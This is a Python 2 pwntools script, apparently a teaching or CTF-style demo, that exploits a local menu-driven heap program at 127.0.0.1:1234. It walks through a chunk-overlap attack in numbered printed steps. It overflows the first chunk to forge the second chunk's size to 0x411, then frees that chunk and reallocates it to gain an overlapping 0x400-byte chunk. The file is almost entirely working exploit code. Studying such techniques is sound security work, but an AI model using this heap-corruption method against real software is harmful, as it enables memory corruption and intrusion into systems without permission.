#!/usr/bin/env python2

from pwn import *
import re

host = '127.0.0.1'
port = 1234
conn = remote(host,port)
data = conn.recv()

print "Chunk overlap"
print ""
print "1 . ask for 0x20 bytes (chunk 1)"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x20)+"\n")
sleep(0.1)
data = conn.recv()
fc_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s" % fc_addr
print ""
fc_addr =int(fc_addr,16)

print "2. ask for 0x20 more bytes (chunk 2)"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x20)+"\n")
sleep(0.1)
data = conn.recv()
sc_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s" % sc_addr
print ""
sc_addr =int(sc_addr,16)

print "3. overflow first chunk to craft size of the second one to 0x411 (f.e. max at tcache)"
print "   0x400 + header : 0x10 + inuse flag : 0x1"
print ""
conn.send("3\n")
sleep(0.1)
data = conn.recv()
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(p64(0x0)*4 + p64(0x20) + p64(0x411))
sleep(0.1)
data = conn.recv()

print "4. chunk 2 is freed"
print ""
conn.send("2\n")
sleep(0.1)
data = conn.recv()
conn.send("2\n")
sleep(0.1)
data = conn.recv()

print "5. We ask for 0x400 bytes, max for a tcache entry"
conn.send("1\n")
sleep(0.1)
data = conn.recv()
conn.send(str(0x400)+"\n")
sleep(0.1)
data = conn.recv()
fc_addr = re.findall(r'\(.+\)', data.splitlines()[0])[0][1:-1]
print "addr : %s" % fc_addr
print ""

print "We own a chunk that let us write 0x400 bytes, but next chunk is 0x20 bytes far from ours"
raw_input ("press any key")
conn.send("8\n")
